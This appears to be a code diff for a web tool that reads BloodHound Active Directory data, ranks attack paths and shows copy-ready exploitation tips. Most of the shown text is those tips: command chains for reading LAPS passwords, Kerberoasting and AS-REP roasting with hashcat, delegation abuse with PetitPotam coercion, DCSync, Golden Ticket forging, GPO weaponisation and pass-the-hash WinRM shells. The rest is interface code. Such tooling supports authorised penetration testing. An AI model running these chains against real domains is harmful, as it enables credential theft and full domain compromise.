+Sync-LAPS -LDAPFilter '(samaccountname=TARGET$)' -Domain DOMAIN
+
+=== USE THE PASSWORD ===
+# Once the LAPS password is recovered, use it like a local admin password on that host:
+evil-winrm -i TARGET_HOST -u Administrator -p 'LAPS_PASSWORD'
+nxc smb TARGET_HOST -u Administrator -p 'LAPS_PASSWORD'
+
+=== NOTE ===
+# This is not the same as direct ReadLAPSPassword on one computer object.
+# It is a domain-level replication-style path and may generate 4662 events if audited.
+SOURCE: https://bloodhound.specterops.io/resources/edges/sync-laps-password""",
+
+'ReadLAPSPassword': """=== CORE IDEA ===
+# ReadLAPSPassword means the controlled principal can read the local admin password stored on the target computer object.
+# Classic LAPS attribute: ms-MCS-AdmPwd. Windows LAPS may use msLAPS-* attributes.
+
+=== READ THE PASSWORD FROM LDAP ===
+# Impacket:
+impacket-GetLAPSPassword -computer TARGET$ -dc-ip DC_IP DOMAIN/USER:PASS
+# Add -ldaps if the DC requires LDAPS.
+
+# bloodyAD classic LAPS:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'TARGET$' --attr ms-MCS-AdmPwd
+
+=== USE NETEXEC DIRECTLY WITH LAPS ===
+# NetExec can read the LAPS password and use it over SMB/WinRM:
+nxc smb TARGET_IP -u USER -p PASS --laps
+nxc winrm TARGET_IP -u USER -p PASS --laps
+# If the local admin account is renamed:
+nxc winrm TARGET_IP -u USER -p PASS --laps Administrator
+
+=== USE THE PASSWORD MANUALLY ===
 evil-winrm -i TARGET_IP -u Administrator -p 'LAPS_PASSWORD'
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/readlapspassword""",
+nxc smb TARGET_IP -u Administrator -p 'LAPS_PASSWORD'
+SOURCE: https://www.netexec.wiki/smb-protocol/defeating-laps""",
 
-'LAPSRead': """nxc ldap DC_IP -u USER -p PASS --laps
-nxc ldap DC_IP -u USER -p PASS -M laps
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'COMPUTER$' --attr ms-MCS-AdmPwd
-evil-winrm -i TARGET_IP -u Administrator -p 'LAPS_PASSWORD'
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/readlapspassword""",
+'MemberOf': """=== CORE IDEA ===
+# MemberOf is not an exploit by itself.
+# It means the source principal belongs to the destination security group.
+# The source inherits the group's effective rights and any attack paths that start from that group.
 
-'MemberOf': """# Group membership - the principal inherits the group ACLs.
-# If the group has rights over an object, the member inherits them.
-# Check the group rights on the ACLs tab!""",
+=== WHAT TO CHECK ===
+# Look at the destination group's outbound/inbound rights:
+# - ACL rights the group has over users, computers, groups, GPOs, OUs, or the domain
+# - nested group membership that leads to a higher-value group
+# - local admin / remote management style rights if present in the dataset
 
-'AllowedToDelegate': """=== CONSTRAINED DELEGATION (T2A4D) ===
-impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -altservice 'cifs/DC_HOST' DOMAIN/USER:PASS -dc-ip DC_IP
-export KRB5CCNAME=Administrator@cifs_DC.ccache
+=== NEXT STEP ===
+# Follow the next meaningful edge after the group.
+# If the group has GenericAll/AddMember/WriteDacl/etc., use that specific edge's tip instead.
+SOURCE: https://bloodhound.specterops.io/resources/edges/member-of""",
+
+'Contains': """=== CORE IDEA ===
+# Contains is a scope/inheritance edge, not an exploit by itself.
+# It means an OU/container/domain contains the destination object.
+# Linked GPOs and inheritable ACEs on the parent can affect contained child objects.
+
+=== WHAT TO CHECK ===
+# Look at the parent container's inbound edges:
+# - GPLink from GPOs that apply to the contained users/computers
+# - WriteDacl / GenericAll / Owns-style rights on the parent that may inherit to children
+# - whether inheritance is blocked or the GPO link is enforced
+
+=== NEXT STEP ===
+# Follow the actual control edge: GPLink, WriteGPLink, WriteDacl, GenericAll, etc.
+# Do not treat Contains alone as control of the child object.
+SOURCE: https://bloodhound.specterops.io/resources/edges/contains""",
+
+'GpLink': """=== CORE IDEA ===
+# GPLink means a GPO is linked to a domain or OU.
+# The GPO's settings apply to users/computers in that scope; enforced links can bypass blocked inheritance.
+# GPLink alone does not mean you can modify the GPO.
+
+=== WHAT TO CHECK ===
+# Check whether the controlled principal has rights over the linked GPO:
+# - GenericAll / GenericWrite / WriteDacl / WriteOwner on the GPO
+# - WriteGPLink on the domain/OU if the path is about linking a GPO
+# - security filtering / WMI filtering that narrows the affected targets
+
+=== NEXT STEP ===
+# If you control the GPO, use a GPO abuse workflow such as SharpGPOAbuse/pyGPOAbuse.
+# If you only see GPLink, treat it as "this GPO affects this scope", not as an abuse primitive.
+SOURCE: https://bloodhound.specterops.io/resources/edges/gp-link""",
+
+'WriteGPLink': """=== CORE IDEA ===
+# WriteGPLink means the controlled principal can modify the gPLink attribute on a domain or OU.
+# This can link a GPO to that scope, causing the GPO to apply to contained users/computers, including nested OUs.
+# This is different from GPLink: GPLink is an existing link; WriteGPLink is permission to change links.
+
+=== ABUSE PATH ===
+# 1. Prefer using an already-controlled GPO, or first gain control of a GPO.
+# 2. Link that GPO to the target OU/domain.
+# 3. Weaponize the GPO with a focused change, such as an immediate scheduled task.
+# 4. Use security filtering / WMI filtering where possible to reduce blast radius.
+
+=== TOOLS ===
+# Windows:
+SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author DOMAIN\\Admin --Command 'cmd.exe' --Arguments '/c whoami > C:\\Windows\\Temp\\gpo.txt' --GPOName 'CONTROLLED_GPO'
+
+# Linux:
+./pygpoabuse.py DOMAIN/USER:PASS -gpo-id "GPO_GUID" -powershell -command "whoami > C:\\Windows\\Temp\\gpo.txt" -taskname "Update"
+
+=== CHECKS / LIMITS ===
+# Without control of a GPO, WriteGPLink alone is not enough for the simple path.
+# Fake/remote GPO approaches exist but require extra setup, DNS/machine-account conditions, and are much easier to get wrong.
+# Expect normal Group Policy refresh timing unless you can trigger gpupdate or coerce a refresh.
+SOURCE: https://bloodhound.specterops.io/resources/edges/write-gp-link""",
+
+'AllowedToDelegate': """=== CORE IDEA ===
+# Controlled account has Kerberos Constrained Delegation to specific SPNs in msDS-AllowedToDelegateTo.
+# You can request a service ticket as another user only to those delegated services.
+# Protected Users / "Account is sensitive and cannot be delegated" can block impersonation.
+
+=== WITH PROTOCOL TRANSITION (T2A4D / TrustedToAuthForDelegation) ===
+# S4U2Self + S4U2Proxy: impersonate a delegable user to the delegated SPN.
+impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/USER:PASS
+export KRB5CCNAME=<generated_ticket>.ccache
+
+# Use the ticket against the target service:
+impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN
+# If the delegated target is a DC service, DCSync may be possible:
 impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/Administrator@DC_HOST -dc-ip DC_IP
+
+=== ALTSERVICE / ANYSPN NOTE ===
+# The ticket service class can often be changed for the same host (for example HTTP -> CIFS/LDAP):
+impacket-getST -spn 'http/TARGET.DOMAIN' -altservice 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/USER:PASS
+# This does not make arbitrary hosts valid; the host must match the delegation context.
+
+=== WITHOUT PROTOCOL TRANSITION ===
+# Kerberos-only constrained delegation needs a forwardable service ticket from the victim to the KCD service.
+# A simple getST -impersonate flow will usually fail with KDC_ERR_BADOPTION.
+# If you already captured a forwardable ticket to the KCD service, use S4U2Proxy with that ticket:
+impacket-getST -spn 'cifs/TARGET.DOMAIN' -additional-ticket victim_to_kcd_service.ccache -dc-ip DC_IP DOMAIN/USER:PASS
 SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained""",
 
-'Pre2KAbuse': """# logonCount=0 -> password = lowercase hostname (e.g. WEB01$ -> web01)
+'Pre2KCompatible': """=== CORE IDEA ===
+# Compatibility-created computer accounts may have predictable initial passwords:
+# lowercase hostname without the trailing $ (for example WEB01$ -> web01).
+# This is mainly useful for unused/pre-created computer objects, not normal joined machines.
+
+=== FIND / TEST CANDIDATES ===
 nxc ldap DC_IP -u USER -p PASS -M pre2k
 pre2k auth -u USER -p PASS -dc-ip DC_IP -d DOMAIN
-rpcchangepwd.py -no-pass 'DOMAIN/MACHINE$:machine' DC_IP
-impacket-getTGT DOMAIN/'MACHINE$' -no-pass -dc-ip DC_IP
+
+# Manual test against one machine account:
+impacket-getTGT DOMAIN/'MACHINE$':'machine' -dc-ip DC_IP
+
+=== AFTER A HIT ===
+# Treat a successful guess as control of that computer account.
+# Change the password or use Kerberos with the obtained ccache:
+rpcchangepwd.py 'DOMAIN/MACHINE$:machine' -newpass 'NewMachinePass123!' DC_IP
+impacket-getTGT DOMAIN/'MACHINE$':'NewMachinePass123!' -dc-ip DC_IP
+export KRB5CCNAME='MACHINE$.ccache'
 SOURCE: https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers""",
 
-'Pre2KCompatible': """# logonCount=0 -> password = lowercase hostname (e.g. WEB01$ -> web01)
-nxc ldap DC_IP -u USER -p PASS -M pre2k
-pre2k auth -u USER -p PASS -dc-ip DC_IP -d DOMAIN
-rpcchangepwd.py -no-pass 'DOMAIN/MACHINE$:machine' DC_IP
-impacket-getTGT DOMAIN/'MACHINE$' -no-pass -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers""",
+'Kerberoast': """=== CORE IDEA ===
+# Kerberoast needs valid domain credentials.
+# Target: enabled user/service account with an SPN and a human-crackable password.
+# Output: $krb5tgs$ hash for offline cracking; cracking success gives the service account password.
 
-'Kerberoast': """impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt
+=== REQUEST TGS HASHES ===
+# Impacket:
+impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt
+
+# NetExec:
 nxc ldap DC_IP -u USER -p PASS --kerberoasting kerberoast.txt
+
+=== CRACK ===
+# RC4 / etype 23:
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+# AES / etype 17:
+hashcat -m 19600 kerberoast.txt /usr/share/wordlists/rockyou.txt
+# AES / etype 18:
 hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+=== NEXT STEP ===
+# Validate cracked credentials and continue with that account's actual rights:
+nxc smb TARGET_HOST -u SERVICE_USER -p 'CRACKED_PASSWORD'
 SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/kerberoast""",
 
-'ASREProast': """impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt
+'ASREProast': """=== CORE IDEA ===
+# ASREProast targets users with "Do not require Kerberos preauthentication" enabled.
+# It can request AS-REP material for offline cracking; the returned TGT is not directly usable without cracking.
+
+=== REQUEST AS-REP HASHES ===
+# With valid domain credentials / LDAP enumeration:
+impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt
 nxc ldap DC_IP -u USER -p PASS --asreproast asrep.txt
+
+# If you already have a user list, authentication may not be required:
+impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt
+
+=== CRACK ===
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+
+=== NEXT STEP ===
+# Validate cracked credentials and continue with that account's actual rights:
+nxc smb TARGET_HOST -u TARGET_USER -p 'CRACKED_PASSWORD'
 SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/asreproast""",
 
-'UnconstrainedDelegation': """# 1. Coerce DC authentication:
+'UnconstrainedDelegation': """=== CORE IDEA ===
+# If you control an account/computer trusted for unconstrained delegation, Kerberos auth to it may include the caller's delegated TGT.
+# Abuse usually means: make/coerce a privileged host or user authenticate to the unconstrained host, capture the TGT, then pass the ticket.
+# Protected Users / "Account is sensitive and cannot be delegated" normally blocks delegated TGT capture.
+
+=== WINDOWS ON THE UNCONSTRAINED HOST ===
+# Monitor for incoming delegated TGTs:
+Rubeus.exe monitor /interval:1 /nowrap
+
+# Coerce authentication to the unconstrained host from the attacker side:
 python3 PetitPotam.py -u USER -p PASS -d DOMAIN UNCONSTRAINED_HOST DC_IP
 coercer coerce -u USER -p PASS -d DOMAIN -l UNCONSTRAINED_HOST -t DC_IP
-# 2. Capture the TGT (Rubeus on the unconstrained host):
-Rubeus.exe monitor /interval:1 /nowrap
-# 3. PTT → DCSync:
+
+# Use captured DC TGT for DCSync:
 export KRB5CCNAME=DC01.ccache
 impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/DC01$@DC01.DOMAIN -dc-ip DC_IP
+
+=== LINUX / KRBRELAYX STYLE ===
+# When the unconstrained account is a computer, you may need an SPN/DNS name pointing to your listener and the right key to decrypt tickets.
+# This path is more setup-heavy; use krbrelayx/addspn/dnstool workflows when operating from Linux.
 SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained""",
 
-'GoldenTicket': """# 1. Domain SID:
+'GoldenTicket': """=== CORE IDEA ===
+# Golden Ticket requires the krbtgt long-term key: NT hash or AES key.
+# This is post-compromise lateral movement/persistence, not an initial privilege escalation path.
+# Since Nov 2021 hardening, use an existing AD username rather than an arbitrary fake user.
+
+=== PREP ===
+# Get domain SID:
 impacket-lookupsid DOMAIN/USER:PASS@DC_IP | grep 'Domain SID'
-# 2. Golden ticket:
-impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXX -domain DOMAIN Administrator
-# 3. Usage:
-export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass DOMAIN/Administrator@DC_HOST
-SOURCE: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket""",
 
-'Timeroast': """python3 timeroast.py DC_IP -o timeroast_hashes.txt
-hashcat -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt
-SOURCE: https://github.com/SecuraBV/Timeroast""",
+# Get krbtgt material, usually via DCSync:
+impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER:PASS@DC_HOST -dc-ip DC_IP
 
-'ProtectedGroup': """=== REMOVE FROM PROTECTED USERS GROUP ===
-# Check:
+=== FORGE TICKET ===
+# RC4 / NT hash:
+impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid S-1-5-21-XXXXXXX -domain DOMAIN EXISTING_USER
+
+# AES key is preferred when available:
+impacket-ticketer -aesKey KRBTGT_AES_KEY -domain-sid S-1-5-21-XXXXXXX -domain DOMAIN EXISTING_USER
+
+=== USE TICKET ===
+export KRB5CCNAME=EXISTING_USER.ccache
+impacket-psexec -k -no-pass DOMAIN/EXISTING_USER@TARGET_HOST
+impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/EXISTING_USER@DC_HOST -dc-ip DC_IP
+SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden""",
+
+'Timeroast': """=== CORE IDEA ===
+# Timeroast abuses MS-SNTP responses from machine accounts to collect crackable hashes.
+# It is most useful against computer accounts with weak/predictable passwords, often hostname-based.
+
+=== COLLECT SNTP HASHES ===
+# SecuraBV Timeroast:
+python3 timeroast.py DC_IP -o timeroast_hashes.txt
+
+# NetExec alternative if available:
+nxc smb DC_IP -u USER -p PASS -M timeroast
+
+=== CRACK ===
+# Hashcat mode 31300 requires newer Hashcat builds. Use --username when the file includes RID/user prefixes.
+hashcat -m 31300 -a 0 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt --username
+
+# Add a custom wordlist of lowercase hostnames without trailing $:
+# WEB01$ -> web01
+
+=== NEXT STEP ===
+# A cracked value is the computer account password; request a TGT or validate SMB/Kerberos access:
+impacket-getTGT DOMAIN/'MACHINE$':'CRACKED_PASSWORD' -dc-ip DC_IP
+SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/timeroast""",
+
+'ProtectedGroup': """=== CORE IDEA ===
+# TARGET is in the Protected Users group.
+# This limits credential theft and delegation abuse: no NTLM auth, no DES/RC4 Kerberos, no unconstrained/constrained delegation, short TGT lifetime.
+# Treat this as a blocker/constraint unless you also control membership of the Protected Users group.
+
+=== CHECK MEMBERSHIP ===
 bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'Protected Users' --attr member
-# Removal (requires GenericAll / WriteDacl):
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP remove groupMember 'Protected Users' TARGET
-# Verify removal:
-nxc ldap DC_IP -u USER -p PASS --groups | grep 'Protected'
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/addmember""",
 
-'RemoteManagementUsers': """=== WINRM LOGIN (Remote Management Users tag) ===
-# evil-winrm (Ruby — recommended):
-evil-winrm -i DC_IP -u USER -p PASS
-evil-winrm -i DC_IP -u USER -H NTLM_HASH
-# evil-winrm.py (Python):
-python3 evil-winrm.py -i DC_IP -u USER -p PASS
-python3 evil-winrm.py -i DC_IP -u USER -H NTLM_HASH
-# nxc check:
-nxc winrm DC_IP -u USER -p PASS
-SOURCE: https://www.thehacker.recipes/ad/movement/winrm""",
+=== REMOVE ONLY IF YOU HAVE RIGHTS ===
+# Requires rights such as GenericAll / WriteDacl / AddMember on the Protected Users group.
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP remove groupMember 'Protected Users' TARGET
+
+=== VERIFY / RE-AUTHENTICATE ===
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'Protected Users' --attr member
+# After removal, request fresh tickets/logon material before retrying delegation or NTLM-dependent paths.
+SOURCE: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group""",
+
+'RemoteManagementUsers': """=== CORE IDEA ===
+# Membership in Remote Management Users can allow WinRM / PowerShell Remoting logon to a host.
+# It is not the same as local Administrator; command execution is limited by the user's actual privileges on the target.
+# Requires WinRM enabled/reachable, usually TCP 5985 HTTP or 5986 HTTPS.
+
+=== CHECK ACCESS ===
+nxc winrm TARGET_HOST -u USER -p PASS
+nxc winrm TARGET_HOST -u USER -H NTLM_HASH
+
+=== INTERACTIVE SHELL ===
+# evil-winrm with password:
+evil-winrm -i TARGET_HOST -u USER -p PASS
+
+# evil-winrm pass-the-hash:
+evil-winrm -i TARGET_HOST -u USER -H NTLM_HASH
+
+# Kerberos, if DNS/FQDN and krb5 config are correct:
+KRB5CCNAME=user.ccache evil-winrm -i TARGET_FQDN -r DOMAIN.FQDN
+
+=== NOTE ===
+# If authentication succeeds but commands fail, check local group membership, UAC filtering, and target WinRM policy.
+SOURCE: https://github.com/Hackplayers/evil-winrm""",
 
 }
 
@@ -324,7 +848,7 @@ def build_graph(data, sid_cache):
     for obj in all_objects:
         target = obj.get('Properties', {}).get('name', obj.get('ObjectIdentifier', '?'))
         for ace in obj.get('Aces', []):
-            right = ace.get('RightName', '')
+            right = RIGHT_ALIASES.get(ace.get('RightName', ''), ace.get('RightName', ''))
             if right not in CRITICAL_RIGHTS:
                 continue
             principal = resolve_sid(ace.get('PrincipalSID', ''), sid_cache)
@@ -498,7 +1022,7 @@ def compute_attack_paths(graph, owned_keys):
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_PAGE)
+    return render_template_string(HTML_PAGE, attack_tips=ATTACK_TIPS)
 
 
 @app.route('/api/upload', methods=['POST'])
@@ -650,11 +1174,12 @@ main{display:flex;flex-direction:column;overflow:hidden}
 .ph-dep{margin-left:auto;color:var(--dim);font-size:.8em}
 .ph-inh{color:var(--dim);font-size:.86em;background:rgba(58,96,112,.2);padding:1px 5px;border-radius:2px}
 .rp{padding:2px 8px;border-radius:3px;font-size:.82em;font-weight:bold;letter-spacing:.5px}
-.rp-GenericAll,.rp-DCSync,.rp-GetChanges,.rp-GetChangesAll{background:rgba(255,34,68,.13);color:var(--red);border:1px solid rgba(255,34,68,.35)}
+.rp-GenericAll,.rp-DCSync,.rp-GetChanges,.rp-GetChangesAll,.rp-GetChangesInFilteredSet{background:rgba(255,34,68,.13);color:var(--red);border:1px solid rgba(255,34,68,.35)}
 .rp-WriteDacl,.rp-WriteOwner,.rp-Owns,.rp-AllExtendedRights{background:rgba(255,107,43,.13);color:var(--orange);border:1px solid rgba(255,107,43,.35)}
 .rp-ForceChangePassword,.rp-AddMember{background:rgba(187,134,252,.12);color:var(--purple);border:1px solid rgba(187,134,252,.35)}
-.rp-GenericWrite,.rp-WriteSPN{background:rgba(255,215,0,.1);color:var(--yellow);border:1px solid rgba(255,215,0,.35)}
-.rp-ReadGMSAPassword{background:rgba(0,255,136,.09);color:var(--green);border:1px solid rgba(0,255,136,.35)}
+.rp-GenericWrite,.rp-WriteSPN,.rp-WriteGPLink{background:rgba(255,215,0,.1);color:var(--yellow);border:1px solid rgba(255,215,0,.35)}
+.rp-ReadGMSAPassword,.rp-SyncLAPSPassword{background:rgba(0,255,136,.09);color:var(--green);border:1px solid rgba(0,255,136,.35)}
+.rp-WriteAccountRestrictions,.rp-AddAllowedToAct,.rp-AllowedToAct{background:rgba(255,107,43,.11);color:var(--orange);border:1px solid rgba(255,107,43,.32)}
 .rp-AddKeyCredentialLink{background:rgba(41,121,255,.1);color:#82b1ff;border:1px solid rgba(41,121,255,.35)}
 .rp-default{background:rgba(90,128,144,.1);color:var(--dim2);border:1px solid rgba(90,128,144,.25)}
 .pchain{display:none;padding:0 13px 11px;border-top:1px solid var(--border)}
@@ -1009,7 +1534,7 @@ tr:hover td{background:rgba(0,212,255,.02)}
     <div class="tabs" id="tabBar" style="display:none">
       <button class="tab active" onclick="switchTab('paths')">⚔ Attack Paths</button>
       <button class="tab" onclick="switchTab('acls')">📋 ACLs</button>
-      <button class="tab" onclick="switchTab('deleg')">🎫 Delegation</button>
+      <button class="tab" onclick="switchTab('deleg')">🎫 Insights</button>
       <button class="tab" onclick="switchTab('overview')">🗺 Overview</button>
       <button class="tab" onclick="switchTab('graph')">🕸 Graph</button>
     </div>
@@ -1050,7 +1575,7 @@ const G_NODE_STROKE = {User:'#007799',Computer:'#aa4400',Group:'#7744aa',Domain:
 const G_NODE_RADIUS = {User:13,Computer:15,Group:17,Domain:19,dc:21,gmsa:12};
 const G_NODE_ICON   = {User:'👤',Computer:'🖥',Group:'👥',Domain:'🌐',dc:'🏴‍☠️',gmsa:'🔑'};
 const G_SEV_COLOR   = {1:'#ff2244',2:'#ff7b2b',3:'#ffd700',4:'#00ff88'};
-const G_SEV_MAP     = {GenericAll:1,DCSync:1,GetChangesAll:1,GetChanges:1,WriteDacl:2,WriteOwner:2,Owns:2,AllExtendedRights:2,ForceChangePassword:3,GenericWrite:3,WriteSPN:3,ReadGMSAPassword:4,AddKeyCredentialLink:3,WriteAccountRestrictions:3,AddMember:4,AddSelf:4,MemberOf:4,Contains:4,ReadLAPSPassword:4};
+const G_SEV_MAP     = {GenericAll:1,DCSync:1,GetChangesAll:1,GetChanges:1,GetChangesInFilteredSet:2,WriteDacl:2,WriteOwner:2,Owns:2,AllExtendedRights:2,ForceChangePassword:3,GenericWrite:3,WriteSPN:3,WriteGPLink:3,ReadGMSAPassword:4,SyncLAPSPassword:4,AddKeyCredentialLink:3,WriteAccountRestrictions:3,AddAllowedToAct:3,AllowedToAct:3,AddMember:4,AddSelf:4,MemberOf:4,Contains:4,ReadLAPSPassword:4};
 const G_SKIP_LABEL  = new Set(['MemberOf','Contains']);
 
 // ── STATE ──
@@ -1167,8 +1692,8 @@ function fillTip(raw) {
 
   return result;
 }
-const SEV_MAP = {GenericAll:1,DCSync:2,GetChangesAll:2,GetChanges:2,WriteDacl:3,WriteOwner:4,Owns:5,ForceChangePassword:6,GenericWrite:7,AllExtendedRights:8,WriteSPN:9,ReadGMSAPassword:10,AddKeyCredentialLink:11,WriteAccountRestrictions:12,AddSelf:13,AddMember:14};
-const RP_CLASSES = {GenericAll:'rp-GenericAll',DCSync:'rp-DCSync',GetChanges:'rp-GetChanges',GetChangesAll:'rp-GetChangesAll',WriteDacl:'rp-WriteDacl',WriteOwner:'rp-WriteOwner',Owns:'rp-Owns',AllExtendedRights:'rp-AllExtendedRights',ForceChangePassword:'rp-ForceChangePassword',AddMember:'rp-AddMember',GenericWrite:'rp-GenericWrite',WriteSPN:'rp-WriteSPN',ReadGMSAPassword:'rp-ReadGMSAPassword',AddKeyCredentialLink:'rp-AddKeyCredentialLink'};
+const SEV_MAP = {GenericAll:1,DCSync:2,GetChangesAll:2,GetChanges:2,GetChangesInFilteredSet:2,WriteDacl:3,WriteOwner:4,Owns:5,ForceChangePassword:6,GenericWrite:7,AllExtendedRights:8,WriteSPN:9,ReadGMSAPassword:10,SyncLAPSPassword:10,AddKeyCredentialLink:11,WriteAccountRestrictions:12,AddAllowedToAct:12,AllowedToAct:12,WriteGPLink:13,AddSelf:14,AddMember:15};
+const RP_CLASSES = {GenericAll:'rp-GenericAll',DCSync:'rp-DCSync',GetChanges:'rp-GetChanges',GetChangesAll:'rp-GetChangesAll',GetChangesInFilteredSet:'rp-GetChangesInFilteredSet',WriteDacl:'rp-WriteDacl',WriteOwner:'rp-WriteOwner',Owns:'rp-Owns',AllExtendedRights:'rp-AllExtendedRights',ForceChangePassword:'rp-ForceChangePassword',AddMember:'rp-AddMember',GenericWrite:'rp-GenericWrite',WriteSPN:'rp-WriteSPN',WriteGPLink:'rp-WriteGPLink',ReadGMSAPassword:'rp-ReadGMSAPassword',SyncLAPSPassword:'rp-SyncLAPSPassword',WriteAccountRestrictions:'rp-WriteAccountRestrictions',AddAllowedToAct:'rp-AddAllowedToAct',AllowedToAct:'rp-AllowedToAct',AddKeyCredentialLink:'rp-AddKeyCredentialLink'};
 const rp = r => `<span class="rp ${RP_CLASSES[r]||'rp-default'}">${r}</span>`;
 
 // ── ZIP UPLOAD — drag & drop ──────────────────────────────────────────────
@@ -1360,7 +1885,10 @@ function renderPathsTab() {
     </div>
     ${filtered.length ? cards : '<div class="no-paths">No results for the current filters</div>'}
   </div>`;
-  document.querySelectorAll('.path-card').forEach(el => el.addEventListener('click', () => el.classList.toggle('expanded')));
+  document.querySelectorAll('.path-card').forEach(el => el.addEventListener('click', e => {
+    if (e.target.closest('button, a, input, textarea, select')) return;
+    el.classList.toggle('expanded');
+  }));
 }
 
 function formatTip(right, raw) {
@@ -1379,7 +1907,7 @@ function formatTip(right, raw) {
     if (codeLines.length) {
       const id = 'pre_' + Math.random().toString(36).slice(2,8);
       html += `<div class="pre-wrap">
-        <button class="copy-btn" onclick="copyPre('${id}')">⎘ copy</button>
+        <button class="copy-btn" onclick="copyPre('${id}', event)">⎘ copy</button>
         <pre id="${id}">${codeLines.map(l => fillTip(l)).join('\n')}</pre>
       </div>`;
       codeLines = [];
@@ -1412,7 +1940,18 @@ function formatTip(right, raw) {
   flushCode(); flushComment();
 
   const srcHtml = srcUrl ? `<div class="tip-src">📎 <a href="${srcUrl}" target="_blank">${escHtml(srcUrl)}</a></div>` : '';
-  return `<div class="chain-tip"><span class="tip-label">// EXPLOIT — ${escHtml(right)}</span>${html}${srcHtml}</div>`;
+  const labelByRight = {
+    MemberOf: 'CONTEXT',
+    Contains: 'CONTEXT',
+    GpLink: 'CONTEXT',
+    GetChanges: 'CONTEXT',
+    GetChangesAll: 'CONTEXT',
+    GetChangesInFilteredSet: 'CONTEXT',
+    ProtectedGroup: 'CONSTRAINT',
+    RemoteManagementUsers: 'ACCESS',
+  };
+  const label = labelByRight[right] || 'EXPLOIT';
+  return `<div class="chain-tip"><span class="tip-label">// ${label} - ${escHtml(right)}</span>${html}${srcHtml}</div>`;
 }
 
 function escHtml(s) {
@@ -1420,7 +1959,11 @@ function escHtml(s) {
 }
 
 // Copy plain text from a <pre> block (strips HTML tags / spans)
-function copyPre(id) {
+function copyPre(id, event) {
+  if (event) {
+    event.preventDefault();
+    event.stopPropagation();
+  }
   const pre = document.getElementById(id);
   if (!pre) return;
   // Extract plain text — strip all HTML tags
@@ -1465,7 +2008,7 @@ function postProcessPreBlocks(container) {
     const btn = document.createElement('button');
     btn.className = 'copy-btn';
     btn.textContent = '⎘ copy';
-    btn.setAttribute('onclick', `copyPre('${id}')`);
+    btn.setAttribute('onclick', `copyPre('${id}', event)`);
     wrap.insertBefore(btn, pre);
   });
 }
@@ -1533,21 +2076,7 @@ function renderDelegTab() {
     html += `<div class="dbox" style="border-color:rgba(255,34,68,.35)">
       <h4 style="color:var(--red)">⚡ Unconstrained Delegation</h4>
       ${rows}
-      <div class="chain-tip" style="margin-top:9px">
-        <span class="tip-label">// EXPLOIT — COERCE + TGT CAPTURE</span>
-        <pre>
-# 1. Coerce authentication (DC → unconstrained host)
-python3 PetitPotam.py -u user -p Pass -d domain.local UNCONSTRAINED_HOST DC_IP
-coercer coerce -u user -p Pass -d domain.local -l UNCONSTRAINED_HOST -t DC_IP
-
-# 2. Capture the TGT (Rubeus monitor on the unconstrained host)
-.\\Rubeus.exe monitor /interval:1 /nowrap
-
-# 3. PTT → DCSync
-export KRB5CCNAME=DC01.ccache
-impacket-secretsdump -k -no-pass -just-dc-ntlm domain/DC01$@dc.domain.local</pre>
-        <div class="tip-src"><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained" target="_blank">thehacker.recipes/unconstrained</a></div>
-      </div>
+      ${formatTip('UnconstrainedDelegation', G_EDGE_TIPS.UnconstrainedDelegation)}
     </div>`;
   }
 
@@ -1561,16 +2090,7 @@ impacket-secretsdump -k -no-pass -just-dc-ntlm domain/DC01$@dc.domain.local</pre
     html += `<div class="dbox">
       <h4 style="color:${t2a4d?'var(--orange)':'var(--cyan)'}">Constrained Delegation${t2a4d?' (T2A4D = protocol transition!)':''}</h4>
       ${rows}
-      ${t2a4d ? `<div class="chain-tip" style="margin-top:9px">
-        <span class="tip-label">// EXPLOIT — S4U2Self + S4U2Proxy</span>
-        <pre>
-impacket-getST -spn 'cifs/TARGET.domain.local' \\
